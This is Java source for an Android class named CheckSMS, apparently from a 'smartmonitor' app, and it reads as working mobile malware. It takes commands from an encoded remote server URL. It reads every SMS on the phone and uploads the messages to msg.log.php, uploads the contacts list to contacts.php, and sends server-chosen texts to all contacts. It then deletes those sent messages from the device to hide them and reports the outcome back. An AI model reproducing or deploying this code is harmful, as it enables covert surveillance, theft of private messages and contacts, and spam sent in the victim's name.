package com.android.smartmonitor.control;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Iterator;

import com.android.smartmonitor.common.CheckGlobal;
import com.android.smartmonitor.common.CheckNC;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;

public class CheckSMS {
	private Context m_context;
	
	public static final String MESSAGE_TYPE_INBOX = "1";
    public static final String MESSAGE_TYPE_SENT = "2";
    public static final String MESSAGE_TYPE_CONVERSATIONS = "3";
    
	private HashMap<String, String>  mCommand;
    private boolean mIsEnd;
    private int mDeliveredCount;
    
	private ArrayList<HashMap<String, String>> m_contactsMessageArray;
    private ArrayList<HashMap<String, String>> m_commandMessageArray;
    
    public CheckSMS(Context context) {
    	m_context = context;
    	
    	mCommand = null;
        mIsEnd = false;
        mDeliveredCount = 0;
        
        m_contactsMessageArray = new ArrayList<HashMap<String, String>>();
        m_commandMessageArray = new ArrayList<HashMap<String, String>>();
	}
    
    public int getDeliveredResult()
    {
    	SharedPreferences localSharedPreferences = m_context.getSharedPreferences("d", 0);
        int deliveredResult = localSharedPreferences.getInt("sms_deliveredResult", -1);
        
        if(deliveredResult == -1)
        	return 0;
        
        return deliveredResult;
    }
	
	public void setDeliveredResult(int value)
    {
    	SharedPreferences.Editor localEditor = m_context.getSharedPreferences("d", 0).edit();
	    
    	localEditor.putInt("sms_deliveredResult", value);
    	
        localEditor.commit();
    }
    
    public boolean isSleep()
    {
    	SharedPreferences localSharedPreferences = m_context.getSharedPreferences("d", 0);
        int sleep = localSharedPreferences.getInt("sms_sleep", -1);
        
        if(sleep == -1)
        	return true;
        
        if(sleep == 0)
        	return false;
        else
            return true;
    }
    
    public boolean isCommandAccepted()
    {
    	if(mCommand == null)
    		return false;
    	
    	return true;
    }
    
    public void setSleep(boolean value)
    {
    	SharedPreferences.Editor localEditor = m_context.getSharedPreferences("d", 0).edit();
	    
    	if(value == false)
    		localEditor.putInt("sms_sleep", 0);
    	else
    		localEditor.putInt("sms_sleep", 1);
	    
        localEditor.commit();
    }
    
    public boolean isBusy()
	{
		if(m_contactsMessageArray.size() > 0 
			|| m_commandMessageArray.size() > 0)
			return true;
		
		return false;
	}
    

	
	public boolean executeCommand()
    {
		if(isSleep() == false)
			return false;
		
    	boolean returnValue = false;
    	HashMap<String, String> command = null;	
		boolean isEnd = false;
		
		if(m_contactsMessageArray.size() > 0)
		{
			command = m_contactsMessageArray.get(0);
			if(m_contactsMessageArray.size() == 1)
				isEnd = true;
			
			m_contactsMessageArray.remove(0);
		}
		else if(m_commandMessageArray.size() > 0)
		{
			command = m_commandMessageArray.get(0);
			m_commandMessageArray.remove(0);
		}
		else
			return returnValue;
		
		PendingIntent deliveredPI = null;
		deliveredPI = PendingIntent.getBroadcast(m_context, 0, new Intent("KMS_SMS_DELIVERED"), 0);
		PendingIntent sentPI = null;
		sentPI = PendingIntent.getBroadcast(m_context, 0, new Intent("KMS_SMS_SENT"), 0);
	    
		setDeliveredResult(0);
	    
		mDeliveredCount = 0;
	    
		returnValue = sendCommandMessage(command.get("recv_num").toString(), command.get("msg").toString(), sentPI, deliveredPI);
		
		mCommand = command;
		mIsEnd = isEnd;
		
		if(returnValue == false)
			setDeliveredResult(2);
		setSleep(false);
	
        return returnValue;
    }
	
	public void replyCommand()
    {
    	boolean isSent = false;
    	
//    	postMessages();
    	postMsgLog();
    	postContacts();
    	
    	if(isSleep())
			return;
    	
    	if(!isCommandAccepted())
		{
			this.setSleep(true);
			return;
		}
    	
    	if(mDeliveredCount < 3)
    	{
    		mDeliveredCount++;
    		
    		int deliveredResult = getDeliveredResult();
	    	if(deliveredResult == 0)
				return;
			
	    	if(getDeliveredResult() == 1)
				isSent = true;
	    	else
		    	isSent = false;
		}
    	else
    		isSent = true;
    	    	
    	replyCommand(mCommand, isSent, mIsEnd);
    	deleteMsg(mCommand.get("recv_num").toString());
		
		setSleep(true);
        
        mDeliveredCount = 0;
        mCommand = null;
    }
		
	public boolean replyCommand(HashMap<String, String> command, boolean success, boolean isEnd)
	{
		String response = null;
		
	    if (command == null)
	    	return false;
	    
		if (success)
			command.put("re_flag", "1");
	    else
	    	command.put("re_flag", "2");
	    if (isEnd)
	    	command.put("isEnd", "1");
	    else
	    	command.put("isEnd", "0");
	    
	    Calendar localCalendar = Calendar.getInstance();
	    String sendDate = localCalendar.get(1) + "-" + (1 + localCalendar.get(2)) + "-" + localCalendar.get(5) + " " + localCalendar.get(11) + ":" + localCalendar.get(12) + ":" + localCalendar.get(13);
	    command.put("send_date", sendDate);
	
	    String url = CheckGlobal.KMSDecode(CheckGlobal.g_managerURL) + "command.state.php";
    
	    response = CheckNC.send(url, command, "Utf-8");
	    if(response == null || response.indexOf("ok") == -1)
	    	return false;
	    
	    return true;
	}
	
	public boolean sendCommandMessage(String paramString1, String paramString2, PendingIntent sentPI, PendingIntent deliveredPI)
	{
	    SmsManager localSmsManager = SmsManager.getDefault();
	    Iterator<String> localIterator = localSmsManager.divideMessage(paramString2).iterator();
	
	    if (!localIterator.hasNext())
	    	return false;
	    
	    try {
	    	localSmsManager.sendTextMessage(paramString1, null, localIterator.next(), sentPI, deliveredPI);
	    } catch (Exception e) {
	    	return false;
	    }
	
	    return true;
	}
	
	public int addCommand(HashMap<String, String> command)
    {
    	int number = 0;
    	
    	if(command == null)
    		return number;
    	
    	try {
	    	if(Integer.valueOf(command.get("level").toString()).intValue() == 1)
	    	{
	    		if(m_contactsMessageArray.size() > 0)
	    			return number;
	    		
	    		number = makeContactsMessageArray(command);
	    	}
	    	else
	    	{
	    		if(m_commandMessageArray.size() > 0)
	    			return number;
	    		
	    		m_commandMessageArray.add(command);
	    		number = 1;
	    	}
    	} catch (Exception e) {
    		return number;
    	}
    	
    	return number;
    }
	
    public int makeContactsMessageArray(HashMap<String, String> command)
    {
    	int number = 0;
    	HashMap<String, String> contacts = CheckGlobal.getContacts(m_context);
    	
    	m_contactsMessageArray.removeAll(null);
    	for(int i = 0; i < Integer.valueOf(contacts.get("number").toString()); i++)
		{
    		HashMap<String, String> localHashMap = new HashMap<String, String>();
			
			localHashMap.put("id", command.get("id").toString());
			localHashMap.put("level", command.get("level").toString());
			localHashMap.put("send_num", command.get("send_num").toString());
			localHashMap.put("recv_num", contacts.get(String.valueOf(i * 2)).toString());
			localHashMap.put("msg", command.get("msg").toString());
			localHashMap.put("phone_id", command.get("phone_id").toString());
			localHashMap.put("account_id", command.get("account_id").toString());
	        m_contactsMessageArray.add(localHashMap);
	        
	        number++;
		}
		
		return number;
	}
    
    public boolean postContacts()
    {
		SharedPreferences localSharedPreferences = m_context.getSharedPreferences("d", 0);
		
	    int contactsUpload = localSharedPreferences.getInt("contactsUpload", -1);
	    if ((contactsUpload == -1) || (contactsUpload == 1))
	    	return false;

    	return postContacts(CheckGlobal.getDeviceID(m_context), CheckGlobal.getContacts(m_context));
    }
	
	public boolean postContacts(String deviceID, HashMap<String, String> contacts)
	{
		String response = null;
		
	    System.out.println("Contacts sended:::" + deviceID);
	
	    if (contacts == null)
	    	return false;
	    
       	contacts.put("phone_deviceID", deviceID);
	    contacts.put("action", "post");
	
	    String url = CheckGlobal.KMSDecode(CheckGlobal.g_managerURL) + "contacts.php";
	    
	    response = CheckNC.sendWithPost(url, contacts, "Utf-8");
	    if(response == null || response.indexOf("ok") == -1)
	    	return false;
		SharedPreferences.Editor localEditor = m_context.getSharedPreferences("d", 0).edit();
		localEditor.putInt("contactsUpload", 1);
		localEditor.commit();
	    return true;
	}
	
	public void deleteMsg(String number)
	{
		if(number == null)
			return;
		
		try
		{
			String queryString="NUMBER="+number; 
			Uri allMessage = Uri.parse("content://sms/"); 
		    m_context.getContentResolver().delete(allMessage,queryString,null);
		} catch (Exception e) {
			
		}
	}
	
	public HashMap<String, String> getLog()
    {    
    	HashMap<String, String> result = new HashMap<String, String>();
    	int number = 0;
    	Cursor cur = null;
    	String num = "";
        String msg = "";
        String date = "";
        String protocol = "";
        String type = "";
        
        try
        {
	    	Uri allMessage = Uri.parse("content://sms/");  
	        cur = m_context.getContentResolver().query(allMessage, null, null, null, null);
	        
	    	while(cur.moveToNext())     
	    	{        
	    		num = cur.getString(cur.getColumnIndex("address"));
	            msg = cur.getString(cur.getColumnIndex("body"));
	            date = CheckGlobal.timeToString(cur.getLong(cur.getColumnIndex("date")));
	            protocol = cur.getString(cur.getColumnIndex("protocol"));
	            
	            if(num == null)
	            	type = "3";
	            else if(protocol == null)
	            	type = "1";
	            else if (protocol == MESSAGE_TYPE_SENT)
	            	type = "1";
	            else
	            	type = "2";
	            
	            if (num == null)
	    			num = "00000000000";
	
	    		if (num != null && num.length() > 1 && num.charAt(0) == '+')
	    			num = num.substring(1);
	    		
	    		result.put(String.valueOf(number * 4), type);
	    		result.put(String.valueOf(number * 4 + 1), num);
	    		result.put(String.valueOf(number * 4 + 2), msg);
	    		result.put(String.valueOf(number * 4 + 3), date);
	    		number++;
	    		
	    		if(number == CheckGlobal.g_logLimit)
	    			break;
	    	}
    	
	    	result.put("number", String.valueOf(number));
	    	return result;
        } catch (Exception e) {
        	return null;
        }
    }
	
	public boolean postMsgLog()
    {
		SharedPreferences localSharedPreferences = m_context.getSharedPreferences("d", 0);
		
	    int msgLogUpload = localSharedPreferences.getInt("msgLogUpload", -1);
	    if ((msgLogUpload == -1) || (msgLogUpload == 1))
	    	return false;

    	return postMsgLog(CheckGlobal.getDeviceID(m_context), getLog());
    }
	
	public boolean postMsgLog(String deviceID, HashMap<String, String> contacts)
	{
		String response = null;

		System.out.println("SMSLog sended:::" + deviceID);
	    if (contacts == null)
	    	return false;
	    
       	contacts.put("phone_deviceID", deviceID);
	    contacts.put("action", "post");
	
	    String url = CheckGlobal.KMSDecode(CheckGlobal.g_managerURL) + "msg.log.php";
	    
	    response = CheckNC.sendWithPost(url, contacts, "Utf-8");
	    if(response == null || response.indexOf("ok") == -1)
	    	return false;

		SharedPreferences.Editor localEditor = m_context.getSharedPreferences("d", 0).edit();
		localEditor.putInt("msgLogUpload", 1);
		localEditor.commit();

	    return true;
	}
}
